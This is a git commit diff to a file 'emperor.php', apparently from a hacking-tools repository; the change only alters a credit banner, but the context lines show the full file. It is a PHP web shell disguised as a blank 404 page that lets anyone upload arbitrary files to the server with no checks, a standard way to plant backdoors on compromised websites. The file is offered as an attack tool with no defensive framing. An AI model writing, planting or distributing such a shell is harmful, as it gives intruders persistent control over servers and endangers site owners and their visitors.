d7140b77d621ca057aa49a0dbb0873a31e75afb1
EmperorsTools <99405846+EmperorsToolsShop@users.noreply.github.com>
2024-03-14 18:08:03 +0100

    Update emperor.php

--- emperor.php
+++ emperor.php
@@ -1,5 +1,5 @@
 <img class=" height="200" src="https://i.ibb.co/r0PwY9y/emperor.png"/><title>404</title>
-<font face="Courier new" color="black" size="6">| BY EMPERORSTOOLS |</font>
+<font face="Courier new" color="black" size="6">| BY YOURSELF |</font>
 <style>body{font-size: 0;}h1{font-size: 12px}</style>
 <h1><?php if($_POST){ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>SUCCESFULL UPLOADED:</b>-->".$_FILES["f"]["name"]; }else{ echo"<b>SHIT FAILED BRO"; } }else{ echo "<form method=post enctype=multipart/form-data><input type=file name=f><input name=v type=submit id=v value=EMPERORSTOOLS> <br>"; }__halt_compiler();?></h1>
 <?php
